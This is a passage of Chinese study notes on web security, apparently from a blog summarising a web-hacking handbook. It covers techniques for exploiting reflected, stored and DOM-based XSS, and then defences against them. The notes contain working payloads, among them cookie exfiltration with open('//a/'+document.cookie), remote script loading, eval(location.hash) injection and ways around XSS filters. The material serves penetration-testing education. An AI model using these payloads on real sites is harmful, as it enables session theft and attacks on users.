&#x27;foo&#x27;&quot;</span>;&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>输入：foo<span class="hljs-symbol">&amp;apos;</span>; alert(1); //<br>直接结果：<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;var a = &#x27;foo<span class="hljs-symbol">&amp;apos;</span>; alert(1); //&#x27;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>解码后结果：<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;var a = &#x27;foo&quot;</span>; <span class="hljs-attr">alert</span>(<span class="hljs-attr">1</span>); //&#x27;&quot;&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>一些净化规则的设计者认为对用户的输入进行 HTML 编码，可以规避 XSS 攻击，但由于浏览器在编译 HTML 文本前，会先对其进行 HTML 解码的动作，因此，规避攻击的意图不一定可以实现；</p>
<h5 id="避开长度限制"><a href="#避开长度限制" class="headerlink" title="避开长度限制"></a>避开长度限制</h5><p>方法一：使用尽可能短的脚本</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">// 将 cookie 传送至主机名为 a 的服务器<br>open(&quot;//a/&quot;+document.cookie)<br><br>// 从主机名为 a 的服务器加载一段脚本<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>注：以上的服务器只能针对局域网内的机器，如果是因特网上的机器，只提供主机名还不够<br></code></pre></td></tr></table></figure>

<blockquote>
<p>有一些第三方工具可以用来尽量缩短有效的 js 代码，例如 javascript packer 工具</p>
</blockquote>
<p>方法二：将一段攻击脚本拆分成多段，分散在同一个页面的不同位置</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html">// 源代码，接收请求 URL：https://sample.com/account.php?page_id=244&amp;seed=123&amp;mode=normal<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;page_id&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;244&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;seed&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mode&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;normal&quot;</span>&gt;</span><br><br>// 攻击者可以将请求参数设计为如下格式：https://sample.com/account.php?page_id=&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-comment">/*&amp;seed=*/</span><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);<span class="hljs-comment">/*&amp;mode=*/</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>得到的结果如下：<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;page_id&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">/*&gt;</span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;seed&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;*/alert(document.cookie);/*&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mode&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;*/</span></span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&quot;&gt;<br>以上结果将执行 &quot;alert(document.cookie);&quot;，同时该脚本前后位置的部分变成了 HTML 注释；<br></code></pre></td></tr></table></figure>

<blockquote>
<p>当使用了长度限制的过滤后，例如将名称限制在 12 个字符以内，开发者有可能觉得如此短的长度，不可能实施有效的 XSS 攻击，因此没有进一步对该输入进行净化过滤，从而攻击者有机会将攻击荷载分散到不同的多个位置，然后其组合起来后，将有效的注释掉两个位置中间的部分；</p>
<p>有可能攻击者在某个中间位置，因为没有长度限制，实施了很严格的净化过滤，但由于前后位置已经被攻陷，导致中间位置的净化完全失去作用；</p>
</blockquote>
<p>方法三：将反射型漏洞转化成 DOM 型漏洞</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">// 假设某个反射型漏洞存在长度限制，攻击者可以在合理的长度范围内，注入一段脚本，让其访问另外一个标签节点的值，并执行它<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>(location.<span class="hljs-property">hash</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> // 该段脚本只有45个字符，但它可以在页面中生成一个 DOM 漏洞，然后攻击者再利用生成的 DOM 漏洞来创造机会，执行位于片断字符串中的另一段脚本；<br><br>完整的请求为：http://sample.com/error/5/error.ashx?message=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>(location.<span class="hljs-property">hash</span>.<span class="hljs-title function_">substr</span>(<span class="hljs-number">1</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>#alert(&#x27;long script insert here...&#x27;)<br><br>或者为：http://sample.com/error.ashx?message=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-built_in">unescape</span>(location))</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>#%0Aalert(&#x27;long script insert here...&#x27;)<br>location 代表的值先被 HTML 解码，然后传递给 eval 命令，整个 URL 作为有效的 javascript 执行；其中 http: 协议前缀作为代码标签，协议前缀后的 // 变成了单行注释的起始点，%0A 经过解码后，变成了换行符，表示注释结束，之后 alert 的代码被执行<br></code></pre></td></tr></table></figure>

<h5 id="实施有效的-XSS-攻击"><a href="#实施有效的-XSS-攻击" class="headerlink" title="实施有效的 XSS 攻击"></a>实施有效的 XSS 攻击</h5><h6 id="将攻击扩展到其他页面"><a href="#将攻击扩展到其他页面" class="headerlink" title="将攻击扩展到其他页面"></a>将攻击扩展到其他页面</h6><p>假如在某个页面发现了一个 XSS 漏洞，但该页面可能并不包含敏感数据，此时需要扩展该漏洞攻击范围。常见方法为利用该漏洞，先传送一个攻击脚本，该脚本用来实现在用户的浏览器中持续运行，监控并提取用户的数据；之后，当用户进入到包含敏感数据的页面时，就可以提取需要的数据了；</p>
<p>例如可以通过创建一个包含整个浏览器窗口的 iframe，然后在该 iframe 中重新加载当前页面；之后用户的浏览操作，实际都是在当前 iframe 中运行，并没有切换页面，从而使得攻击脚本延长了生命周期，得到始终运行；</p>
<h6 id="修改请求方法"><a href="#修改请求方法" class="headerlink" title="修改请求方法"></a>修改请求方法</h6><p>很多应用程序经常同时接受 GET 和 POST 请求，但开发者并没有意识到这点，只将过滤规则适用在其中一个请求上，另外一种请求并没有使用过滤，因此，攻击者有机会利用另外一种请求要实现攻击；</p>
<h6 id="通过-cookie-利用-XSS-漏洞"><a href="#通过-cookie-利用-XSS-漏洞" class="headerlink" title="通过 cookie 利用 XSS 漏洞"></a>通过 cookie 利用 XSS 漏洞</h6><ul>
<li>有些开发者利用 cookie 来保存用户相关的数据，从而实现定制化的效果，但这样其实很危险，因为这意味着攻击者可以提交设计好的字符串，然后让其出现在 cookie 中；之后应用程序的某个功能会去读取该 cookie 值，从而触发恶意脚本的执行；</li>
<li>另外有些应用程序可能还会允许在 URL 中设置与 cookie 同名的参数，然后会读取该参数值，导致漏洞；</li>
<li>一些浏览器使用的扩展技术（如 Flash）可能存在各种漏洞，但没有及时修复，通过利用这些插件本身的漏洞，就可能实现攻击；</li>
<li>在有漏洞的 A 页面设置一个永久性的 cookie 值，然后在 B 页面，当 cookie 被读取时，脚本得以执行；</li>
</ul>
<blockquote>
<p>cookie 攻击可行的本质原因在于 cookie 是跨页面存在的，因此它可以用来在不同页面之间传递数据；</p>
</blockquote>
<h6 id="通过-Referer-消息头利用-XSS-漏洞"><a href="#通过-Referer-消息头利用-XSS-漏洞" class="headerlink" title="通过 Referer 消息头利用 XSS 漏洞"></a>通过 Referer 消息头利用 XSS 漏洞</h6><p>攻击者自建一台服务器，放上目标应用程序的 URL，诱使用户点击；当用户点击后，发给目标程序请求消息头中的 Referer 字段，将自动设置为攻击者的服务器，此时攻击者有机会在该 Referer 字段中放入脚本，当目标程序读取它时，触发执行；</p>
<blockquote>
<p>很多应用程序会尝试读取请求的 Referer 字段来实现一些功能，例如显示访问来源；</p>
</blockquote>
<h6 id="通过非标准请求和响应内容利用-XSS-漏洞"><a href="#通过非标准请求和响应内容利用-XSS-漏洞" class="headerlink" title="通过非标准请求和响应内容利用 XSS 漏洞"></a>通过非标准请求和响应内容利用 XSS 漏洞</h6><p>有些应用程序在脚本中使用 XMLHttpRequest 来发送请求，而无须刷新页面；之后在收到服务端的响应内容后，通过 AJAX 提取内容，并改写  DOM 来实现页面局部内容的变化；</p>
<blockquote>
<p>跨域请求：用户在 A 域名的页面下，发起访问 B 域名的请求；表单是允许的，但是 XHR 是不允许的，除非服务端实现接口；原理很简单：当浏览器发现用户发起向 B 网站的请求时，就向 A 域名的服务器发送一个确认，如果 A 服务器返回的响应中，在报头的 Access-Control-Allow-Origin 字段指示 B 域名是其允许的访问范围，那么浏览器就会向 B 域名发出请求；如果不允许，则浏览器拒绝请求，抛出一个错误；</p>
</blockquote>
<p>通过在 HTTP 报头的 Content-Type 字段指定消息类型，浏览器支持直接处理响应内容，而无须由脚本进行处理；这种情况下，通常注入脚本代码的方式将失效，因为脚本没有机会操作响应内容；</p>
<p>虽然 XHR 不允许跨域请求，但传统的表单则支持向任意的域名发起请求，因此，可以使用表单来发送数据，从而避开 XHR 的限制；</p>
<p>将表单的 enctype 属性值设置为 text&#x2F;plain，可以实现在 HTTP 请求主体中跨域传送数据；其原理在于，当浏览器发现某个表单的 enctype 属性值为  text&#x2F;plain 时，它将按如下的方式处理该表单的数据：</p>
<ul>
<li>在请求中隔行传送每个表单参数；</li>
<li>使用等号分隔每个参数的键名和键值；</li>
<li>不对参数名称和值进行 URL 编码；</li>
</ul>
<blockquote>
<p>注：不是所有的浏览器都遵守上面的做法，需要提前确认；已知浏览器：IE、Firefox、Opera 等；</p>
</blockquote>
<p>这里最大的一个特性在于，浏览器会为键值地自动添加等号，因此攻击者可以利用这个特性来构建数据；假设需要提交的数据格式，本身包含有至少一个等号，那么我们可以将等号左边的数据做为键名，等号右边的数据做为键值，等号则由浏览器自动添加，三者合一，最终形成 XML 数据格式；</p>
<blockquote>
<p>此处的要点在于利用表单的特性，来构建 XML 格式的请求主体；</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html">// 传送跨域的 XML 请求<br>// 将表单的 enctype 属性值设置为 text/plain，可以实现在 HTTP 请求主体中跨域传送数据<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;text/plain&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://sample.com/vuln.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;&lt;?XML version&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;&quot;1.0&quot;?&gt;&lt;data&lt;param&gt;foo&lt;/param&gt;&lt;/data&gt;&#x27;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">submit</span>();</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>如果在包含非标准内容的请求中发现了类似 XSS 漏洞的行为，则可以通过将消息头 Content-Type 属性的值设置为 text&#x2F;plain，然后查看应用程序是否依然能够正常响应；如果可以，说明存在 XSS 攻击漏洞；如果不行，则漏洞无法利用；</p>
</blockquote>
<p>当响应由浏览器直接执行时，浏览器一般会跟消息头中的 Content-Type 规范，对响应内容进行处理；此时如果想要构建能够触发浏览器执的脚本的响应，一般来说需要利用内容类型的一些特点，例如 XML 支持在中间插入 HTML 内容（使用 XML 标签定义一个 XHTML 的命名空间）；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210309084620.png" srcset="/img/loading.gif" lazyload></p>
<h6 id="攻击浏览器-XSS-过滤器"><a href="#攻击浏览器-XSS-过滤器" class="headerlink" title="攻击浏览器 XSS 过滤器"></a>攻击浏览器 XSS 过滤器</h6><p>很多浏览器都内置了防范 XSS 攻击的功能，它们会监控请求和响应，检查其中的内容是否携带 XSS 攻击内容，如果有的话，会对其进行修改，以阻止攻击；</p>
<p>虽然浏览器的内置功能确实可以阻止绝大多数的标准 XSS 攻击，为攻击者带来很大的障碍，但有意思的是，过滤规则本身也会引入新的漏洞，给攻击者新的机会；一些常见的避开办法如下：</p>
<ul>
<li>过滤器经常只检查参数值，只没有检查参数名称；这意味着如果参数名称会回显的话，那么攻击者就可以将脚本注入到参数名称中，避开过滤；</li>
<li>过滤器单独检查每个参数值，但是攻击者可以将攻击脚本分散在多个参数中；当这些参数同时回显时，就能够组合成完整的攻击脚本；</li>
<li>出于性能考虑，过滤器仅检查跨域请求，没有检查由用户点击 URL 发出的本地请求，攻击者可以在内容中放入恶意链接，等待用户点击；</li>
</ul>
<p>利用浏览器本身的非正常行为：</p>
<ul>
<li>当存在多个同名参数时，IE 会将它们串联起来，因此攻击者可以将攻击荷载分散在多个参数中，从而避开 IE 针对单个参数的过滤；但最终串联起来后又能实现预期效果；</li>
<li>过滤器通常基于对输入和输出进行匹配检查，确定二者存在关联；因此攻击者可以故意在输入中放入应用程序的现有脚本，从而利用过滤器将现有脚本进行净化，让其失去作用，例如破坏应用程序在客户端的案例防御功能；</li>
</ul>
<h3 id="查找并利用保存型-XSS-漏洞"><a href="#查找并利用保存型-XSS-漏洞" class="headerlink" title="查找并利用保存型 XSS 漏洞"></a>查找并利用保存型 XSS 漏洞</h3><p>保存型漏洞的探查大体上和反射型类似，但二者还是有如下一些重要的区别</p>
<p>渗透测试步骤</p>
<ul>
<li>反射型漏洞能够直接从应用程序的响应内容中发现，保存型则要曲折一点；当在某个位置提交一个预设输入值的请求后，需要在整个程序的范围去查找该输入会出现在什么地方，因为它不一定直接出现在该请求的响应内容中；同一个输入值有可能出现在很多个不同的页面，并且每个页面可能使用了不同的过滤保护方法，因此需要对每个出现的位置进行单独的分析；</li>
<li>重点检查管理员可以访问的所有应用程序区域，并确认其中是否存在某些内容可以由非管理员用户提交；例如很多应用程序会提供日志浏览功能，这种功能很容易存在漏洞，攻击者可以通过提交包含恶意 HTML 的日志记录，等待管理员浏览时触发；</li>
<li>某些应用程序的功能是由多个步骤组成的，因此单个步骤中提交的数据要最终成功保存并生效，需要彻底完全所有步骤，再判断漏洞是否存在，仅单个步骤不准确；</li>
<li>跟探查反射型漏洞时一样，在提交输入时，除了尝试每一个参数外，还应该包括每一个消息头；同时，在探查保存型漏洞时，还应注意应用程序是否接收一些带外通道数据的功能，这些功能很很可能也是攻击切入点；</li>
<li>如果应用程序允许上传和下载文件，则应探查该功能是否存在保存型漏洞；</li>
<li>发挥想象力，找到各种可能提交输入，并出现在其他用户界面的办法；例如某些应用程序的搜索功能会显示搜索频率最高的关键字，攻击者通过多次提交相同的搜索关键字，即可以引入攻击荷载；</li>
</ul>
<p>在探查完位置后，接下来要考虑两个事情：</p>
<ul>
<li>如果设计荷载，让其出现在目标用户的界面上，实现预期目的；</li>
<li>如果避开过滤</li>
</ul>
<blockquote>
<p>在提交输入请求时，如果存在多个参数，则应该为每个参数设计不同的值，这样才好判断具体是哪个参数，最终出现在哪个位置；如果所有参数值都相同，则很难判断，全部混在一起了；</p>
</blockquote>
<h4 id="在-Web-邮件应用程序中测试-XSS"><a href="#在-Web-邮件应用程序中测试-XSS" class="headerlink" title="在 Web 邮件应用程序中测试 XSS"></a>在 Web 邮件应用程序中测试 XSS</h4><p>Web 邮件应用程序由于需要接收第三方的内容，并展示在界面上以供用户查看，因此其天然存在保存型 XSS 漏洞的风险；最便捷的探查办法是创建一个自己的账户，然后自己给自己发送大量设计过攻击邮件，看攻击是否能够成功；</p>
<blockquote>
<p>如果使用标准的邮件客户端，由于其自带内容净化功能，很可能导致无法将原始内容一字不变的发送出去，此时需要使用一些特殊的邮件发送工具来发送，例如 UNIX sendmail 命令；</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">// 命令<br>sendmail -t <span class="hljs-built_in">test</span>@example.org &lt; email.txt<br></code></pre></td></tr></table></figure>

<p>在 email.txt 文件中指定邮件内容</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210311073209.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>可根据需要使用不同的 content-type 和 charset，以避开目标服务器的过滤机制；</p>
</blockquote>
<h4 id="在上传文件中测试-XSS"><a href="#在上传文件中测试-XSS" class="headerlink" title="在上传文件中测试 XSS"></a>在上传文件中测试 XSS</h4><p>文件上传功能很常见，尤其是图片，常用于 UGC 内容和用户的头像中；该功能是否易于受到攻击，跟几个方面的因素有关：</p>
<ul>
<li>上传时，是否有扩展名的限制；</li>
<li>上传时，是否有检查文件内容，以确认格式正确；</li>
<li>下载时，是否通过 content-type  消息头指定内容类型，例如 image&#x2F;jpeg；</li>
<li>下载时，是否通过 Disposition 消息头，指示浏览器直接保存文件到磁盘上，而非打开它；</li>
</ul>
<p>测试方法：上传一个包含简单的概念验证脚本的文件，然后下载它，看是否会原样返回并执行脚本；如果会的话，则说明漏洞存在；</p>
<p>如果有扩展名限制，则尝试更换其他各种不同的扩展名，因此虽然扩展名与内容可能不同，但如果内容中包含 HTML，它仍然有可能被浏览器执行；</p>
<p>如果应用程序对文件内容进行检查，则可通过混合文件格式来避开，即在一个文件中包含部分指定类型的内容（如图片）；由于浏览器支持越来越多的可执行代码格式，因此混合文件内容的攻击原理仍然适用；</p>
<h4 id="在通过-Ajax-上传的文件中测试-XSS"><a href="#在通过-Ajax-上传的文件中测试-XSS" class="headerlink" title="在通过 Ajax 上传的文件中测试 XSS"></a>在通过 Ajax 上传的文件中测试 XSS</h4><blockquote>
<p>URL 的片断标识符 # 用来对当前 URI 资源的某个局部进行标识，它常用的一个场景是可以记住某个位置，这样当用户在进入这个界面时，通过脚本，可以让页面滚动到指定的局部位置，而无须从头开始浏览；</p>
</blockquote>
<p>由于片断标识符中的内容会被脚本加载，因为它可能存在 XSS 漏洞；攻击者通过在标识符内容中混入某个恶意文件，诱使用户点击，触发恶意文件的加载并执行；例如：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210311081839.png" srcset="/img/loading.gif" lazyload></p>
<p>攻击者甚至可以在标识符内容中放入一个外部服务器的脚本，当用户点击链接时，会向某个攻击者控制的外部服务器发送请求，下载攻击者提前写好的恶意脚本文件；</p>
<h3 id="查找并利用基于-DOM-的-XSS-漏洞"><a href="#查找并利用基于-DOM-的-XSS-漏洞" class="headerlink" title="查找并利用基于 DOM 的 XSS 漏洞"></a>查找并利用基于 DOM 的 XSS 漏洞</h3><blockquote>
<p>DOM 类型的漏洞与反射型漏洞的区别在于前者没有提供 HTML，而是通过将恶意代码混入请求参数来实现攻击；</p>
</blockquote>
<p>常规探查办法：手动浏览应用程序的每个功能，并修改每一个参数，插入一个特殊的测试字符串，然后观察应用程序服务器返回的响应中，是否包含该字符串；</p>
<p>由于不知道应用程序的客户端脚本将如何处理参数和插入方式，使用常规的探查办法可能非常低效，更好的办法是主动阅读目标程序的客户端 JS 代码，了解其处理参数的逻辑，然后有针对性的对输入参数进行设计；已有不少现成的工具可以完成这一个过程，例如 DOMTracer；</p>
<p>渗透测试步骤：</p>
<ul>
<li>在解析应用程序的过程中，检查客户端脚本是否调用 DOM API，如果有的话，再查看页面上是否参数被提交到页面中；常见的 API 如下：<ul>
<li>document.location</li>
<li>document.URL</li>
<li>document.URLUnencoded</li>
<li>document.referer</li>
<li>windown.location</li>
</ul>
</li>
<li>检查 DOM API 的调用代码，了解其处理用户数据的方法，看是否可以使用针对性的输入来执行任意的 js ；</li>
<li>特别注意数据被传送到 document 的以下方法：<ul>
<li>document.write()</li>
<li>document.writeln()</li>
<li>document.body.innerHtml()</li>
<li>eval()</li>
<li>window.execScript()</li>
<li>window.setInterval()</li>
<li>window.setTimeout()</li>
</ul>
</li>
<li>查看客户端的脚本中是否有过滤的代码，如果有的话，了解其过滤机制，以设计避开的办法；</li>
<li>有时候，服务端本身也对输入进行过滤，以避免 DOM 攻击；此时，需要使用前面提到的各种方法，探查服务器的机制；</li>
<li>有些客户端脚本不是将参数解析成键值对，而是直接提取等号位置后面的内容，此时会有两个漏洞：<ul>
<li>服务端很可能只会过滤已知属性，而不会过滤未知属性；因此，攻击者可以插入一个虚拟的参数键值对，避开服务端的过滤；同时利用客户端只提取等号右边内容的特点，让插入值被加载；</li>
<li>由于浏览器不会将片断符的内容提交给服务端，因此攻击可以将恶意内容插入在片断标识符之后；这样可避开服务端的检查，同时内容仍可被客户端加载；</li>
</ul>
</li>
<li>如果客户端脚本对基于 DOM 的数据进行非常复杂的处理，通过静态代码分析很难了解其完整处理过程的话，可以尝试利用 js 调试器来动态监控脚本的执行情况，因为调试器可以很方便的设置断点，监视感兴趣的代码与数据；</li>
</ul>
<h2 id="防止-XSS-攻击"><a href="#防止-XSS-攻击" class="headerlink" title="防止 XSS 攻击"></a>防止 XSS 攻击</h2><h3 id="防止反射型与保存型-XSS-漏洞"><a href="#防止反射型与保存型-XSS-漏洞" class="headerlink" title="防止反射型与保存型 XSS 漏洞"></a>防止反射型与保存型 XSS 漏洞</h3><p>反射型与保存型 XSS 漏洞的根本原因在于未对用户的输入进行严格的过滤和净化；</p>
<p>三重防御法</p>
<h4 id="确认输入"><a href="#确认输入" class="headerlink" title="确认输入"></a>确认输入</h4><ul>
<li>数据长度限制</li>
<li>仅包含合法字符的白名单；</li>
<li>与一个特殊的正则表达式匹配；</li>
<li>对不同的字段应用不同的确认规则</li>
</ul>
<h4 id="确认输出"><a href="#确认输出" class="headerlink" title="确认输出"></a>确认输出</h4><p>如果用户提交的输入需要被复制到响应中的话，那些应该对这些内容进行严格的净化</p>
<ul>
<li>对数据进行 HTML 编码，无谓数据出现在什么地方，无论什么字符；</li>
<li>避免在敏感位置插入用户可以控制的数据；如果一定需要，则应根据用户的输入的类型，插入由开发者提前设计好的内容，而不是复制并插入用户提交的内容；</li>
<li>对用户输入中出现的敏感字符进行转义；</li>
</ul>
<p>输入和输出过滤结合可以带来双重保障，降低被攻击的风险，其中输出过滤必不可少；虽然这会带来一定的性能损失；</p>
<h4 id="消除危险的插入点"><a href="#消除危险的插入点" class="headerlink" title="消除危险的插入点"></a>消除危险的插入点</h4><ul>
<li>避免在现有的 JS 代码中插入用户可控制的数据，包括 <script> 标签和事件处理器</li>
<li>避免在接受 URL 作为标签属性值嵌入用户输入；</li>
<li>在消息头中强制使用指定的编码类型，避免由请求参数或者用户输入进行指定；</li>
</ul>
<h4 id="允许有限的-HTML"><a href="#允许有限的-HTML" class="headerlink" title="允许有限的 HTML"></a>允许有限的 HTML</h4><p>尽量避免接受由用户直接提交包含 HTML 的内容，如果实在必须支持，则应该严格控制用户可用的 HTML 标签子集，避免提供任何引入脚本的方法，例如使用白名单，仅允许特定的标签和属性；即使这样也仍然有风险，因为攻击者可以普通的常用属性中插入脚本；一般来说，较好的办法是找到某个成熟的框架，例如 AntiSamy ，用来过滤用户提交的输入；</p>
<p>另外一种办法是开发某种定制的中间语言，允许用户在输入中使用有限的中间语言，然后再由应用程序进行翻译；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210312195839.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210312195854.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="防止基于-DOM-的-XSS-漏洞"><a href="#防止基于-DOM-的-XSS-漏洞" class="headerlink" title="防止基于 DOM 的 XSS 漏洞"></a>防止基于 DOM 的 XSS 漏洞</h3><h4 id="确认输入-1"><a href="#确认输入-1" class="headerlink" title="确认输入"></a>确认输入</h4><p>在客户端的脚本中，对用户输入进行过滤；同时在服务端对 URL 数据进行严格的确认，以检测出包含攻击脚本和恶意请求，过滤的方法包括：</p>
<ul>
<li>查询字符串中只有一个参数；</li>
<li>参数名为 message，大小写敏感；</li>
<li>参数值仅包含字母或数字内容；</li>
</ul>
<h4 id="确认输出-1"><a href="#确认输出-1" class="headerlink" title="确认输出"></a>确认输出</h4><p>将用户可控制的 DOM 数据插入到文档中之前，应用程序应对其进行 HTML 编码，以便将一些危险的字符安全的显示在页面中，示例如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sanitize</span> (<span class="hljs-params">str</span>) &#123;<br>    <span class="hljs-keyword">const</span> d = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;div&#x27;</span>);<br>    d.<span class="hljs-title function_">appendChild</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createTextNode</span>(str));<br>    <span class="hljs-keyword">return</span> d.<span class="hljs-property">innerHTML</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h1 id="13-攻击其他用户：其他技巧"><a href="#13-攻击其他用户：其他技巧" class="headerlink" title="13. 攻击其他用户：其他技巧"></a>13. 攻击其他用户：其他技巧</h1><h2 id="诱使用户执行操作"><a href="#诱使用户执行操作" class="headerlink" title="诱使用户执行操作"></a>诱使用户执行操作</h2><h3 id="请求伪造"><a href="#请求伪造" class="headerlink" title="请求伪造"></a>请求伪造</h3><p> 攻击者在无需知道受害者的 cookie 是什么，而是直接由浏览器添加该 cookie，在受害者客户端发起伪造的请求；</p>
<h4 id="本站点请求伪造"><a href="#本站点请求伪造" class="headerlink" title="本站点请求伪造"></a>本站点请求伪造</h4><blockquote>
<p>OSRF：on site request forgery</p>
</blockquote>
<p>利用输入可以出现在页面中的特点（即保存型 XSS 漏洞），在页面中插入一个伪造的请求，当用户（尤其是管理员用户）点击该设计好的 URL 链接时，发起一个请求（例如创建一名管理员用户），达到攻击目的</p>
